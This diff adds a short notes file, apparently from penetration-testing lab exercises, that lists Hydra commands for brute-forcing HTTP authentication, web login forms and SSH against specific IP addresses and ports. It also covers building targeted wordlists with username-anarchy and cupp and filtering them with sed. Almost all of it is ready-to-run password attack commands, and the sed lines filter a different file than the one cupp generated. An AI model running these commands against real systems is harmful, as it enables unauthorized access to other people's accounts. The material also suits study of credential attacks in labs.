@@ -1,0 +1,16 @@
+hydra -C SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 209.97.132.235 -s 32124 http-get /
+hydra -L SecLists/Usernames/Names/names.txt -p admin -u -f 138.68.164.196 -s 31964 http-get /
+
+Brute Force forms
+hydra -l admin -P rockyou.txt -f 209.97.185.157 -s 32249 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
+Use burpsuite intercept to check the user&pass parameters:
+user=user&pass=password
+edit the brute-force login page command:
+hydra -l user -P rockyou.txt -f 138.68.164.196 -s 31652 http-post-form "/admin_login.php:user=^USER^&pass=^PASS^:F=<form name='log-in'"
+Brute force SSH login with cupp
+./username-anarchy Harry Potter > user_harry.txt
+cupp -i > Harry > harry.txt
+sed -ri '/^.{,7}$/d' william.txt            # remove shorter than 8
+sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt # remove no special chars
+sed -ri '/[0-9]+/!d' william.txt            # remove no numbers
+hydra -L user_harry.txt -P harry.txt -u -f ssh://209.97.185.157:30870 -t 4 -V
